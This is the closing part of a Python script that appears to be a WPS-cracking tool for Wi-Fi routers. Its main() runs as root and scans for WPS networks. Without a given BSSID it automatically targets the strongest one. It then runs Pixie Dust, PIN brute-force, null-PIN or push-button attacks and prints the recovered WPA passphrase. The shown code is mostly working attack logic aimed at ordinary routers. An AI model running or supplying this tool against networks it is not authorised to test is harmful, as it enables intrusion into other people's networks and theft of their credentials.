    p.add_argument('--vuln-list', type=str,
                   default=os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                        'vulnwsc.txt'),
                   help='File with known-vulnerable WSC device names')
    p.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    return p


def load_vuln_list(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read().splitlines()
    except OSError:
        return []


def main():
    args = build_parser().parse_args()

    if sys.hexversion < 0x03060F0:
        die('This program requires Python 3.6 or newer')
    if os.getuid() != 0:
        die('Run it as root')

    def _terminate(signum, _frame):
        raise KeyboardInterrupt('signal {}'.format(signum))

    for sig in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT):
        try:
            signal.signal(sig, _terminate)
        except (ValueError, OSError, AttributeError):
            pass

    radio = Radio(args.interface, allow_radio_control=not args.no_radio_control)

    if args.probe:
        say(json.dumps(radio.env, indent=2))
        emit('probe', **radio.env)
        return 0

    companion = None
    ok = False
    try:
        if not radio.prepare():
            radio.escalate('no_iface')
        if not radio.env['pixiewps'] and (args.pixie_dust or args.auto):
            warn('[!] pixiewps is not installed — the Pixie Dust step will be skipped')

        if args.scan:
            scanner = WiFiScanner(args.interface, load_vuln_list(args.vuln_list))
            scanner.print_table(scanner.scan())
            return 0

        last_error = None
        for attempt in range(3):
            try:
                companion = Companion(args.interface, args.write,
                                      print_debug=args.verbose,
                                      timeout=args.timeout or None)
                break
            except SupplicantError as e:
                last_error = e
                warn('[!] {}'.format(e))
                emit('supplicant_failed', kind=e.kind, message=str(e),
                     attempt=attempt + 1)
                if attempt == 2:
                    break
                radio.escalate(e.kind)
                time.sleep(1.0)
        if companion is None:
            die('Could not start wpa_supplicant on {}: {}'.format(
                args.interface, last_error))

        bssid = args.bssid
        target = None
        if not bssid and not args.pbc:
            scanner = WiFiScanner(args.interface, load_vuln_list(args.vuln_list))
            networks = scanner.scan()
            scanner.print_table(networks)
            if not networks:
                die('No WPS networks found and no --bssid given')
            target = networks[0]
            bssid = target['BSSID']
            say('[*] No --bssid given, taking the strongest WPS network: {}'.format(bssid))

        if target and target['WPS locked']:
            warn('[!] {} reports WPS as LOCKED — attacks will be refused '
                 'until it unlocks'.format(bssid))
            emit('target_locked', bssid=bssid)

        if args.pbc:
            ok = companion._wps_exchange(bssid, pbc_mode=True)
            if ok:
                companion._credential_print('<PBC>', companion.connection_status.wpa_psk,
                                            companion.connection_status.essid)
        elif args.bruteforce:
            ok = companion.smart_bruteforce(bssid, args.pin, args.delay)
        elif args.null_pin:
            ok = companion.null_pin(bssid)
        elif args.auto:
            ok = companion.auto(bssid, args.show_pixie_cmd, args.pixie_force,
                                try_null=True, max_suggested=args.suggested)
        elif args.pixie_dust:
            ok = companion.pixie_dust(bssid, args.show_pixie_cmd, args.pixie_force,
                                      seed_pin=args.pin)
        elif args.pin is not None:
            ok = companion.try_pin(bssid, args.pin)
        else:
            ok = companion.auto(bssid, args.show_pixie_cmd, args.pixie_force,
                                try_null=True, max_suggested=args.suggested)
    except KeyboardInterrupt:
        say('\nAborting…')
        emit('aborted')
    finally:
        if companion:
            companion.cleanup()
        radio.restore(args.iface_down)

    emit('done', success=bool(ok))
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
